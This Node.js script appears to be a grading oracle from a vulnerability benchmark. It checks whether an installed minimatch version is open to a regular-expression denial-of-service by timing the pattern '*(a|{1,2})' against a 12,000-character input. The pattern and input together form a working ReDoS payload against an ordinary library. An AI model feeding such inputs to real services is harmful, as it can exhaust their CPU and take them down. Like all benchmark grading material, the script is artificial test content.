let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function out() {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence)
  }));
}

try {
  const minimatch = require('minimatch');

  // Benign operation must succeed first.
  const benign1 = minimatch('file.js', '*.js') === true;
  const benign2 = minimatch('file.txt', '*.js') === false;
  if (!benign1 || !benign2) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'benign_operation_failed';
    out();
    return;
  }

  operation_completed = true;

  // Known ReDoS-triggering shape from minimatch brace handling (CVE-era issue).
  // We measure relative slowdown versus a small control input to avoid absolute timing assumptions.
  const attackPattern = '*(a|{1,2})';
  const controlInput = 'a'.repeat(64);
  const maliciousInput = 'a'.repeat(12000);

  function measureMs(fn, rounds) {
    const start = process.hrtime.bigint();
    for (let i = 0; i < rounds; i++) fn();
    const end = process.hrtime.bigint();
    return Number(end - start) / 1e6;
  }

  let controlMs;
  let maliciousMs;
  let controlResult;
  let maliciousResult;

  try {
    controlMs = measureMs(function () {
      controlResult = minimatch(controlInput, attackPattern);
    }, 5);
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'control_call_failed:' + (e && e.message ? e.message : String(e));
    out();
    return;
  }

  try {
    maliciousMs = measureMs(function () {
      maliciousResult = minimatch(maliciousInput, attackPattern);
    }, 1);
  } catch (e) {
    // After successful setup+benign, malicious throw indicates blocked behavior.
    exploit_succeeded = false;
    evidence = 'malicious_threw:' + (e && e.message ? e.message : String(e));
    out();
    return;
  }

  const ratio = maliciousMs / Math.max(controlMs / 5, 0.001);

  // Vulnerable versions show significant superlinear slowdown here;
  // patched versions should avoid this pathological cost.
  exploit_succeeded = maliciousMs > 250 && ratio > 20;
  evidence =
    'pattern=' + attackPattern +
    ';control_len=' + controlInput.length +
    ';malicious_len=' + maliciousInput.length +
    ';control_ms=' + controlMs.toFixed(3) +
    ';malicious_ms=' + maliciousMs.toFixed(3) +
    ';ratio=' + ratio.toFixed(2) +
    ';control_result=' + String(controlResult) +
    ';malicious_result=' + String(maliciousResult);

  out();
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_module_failure:' + (e && e.message ? e.message : String(e));
  out();
}
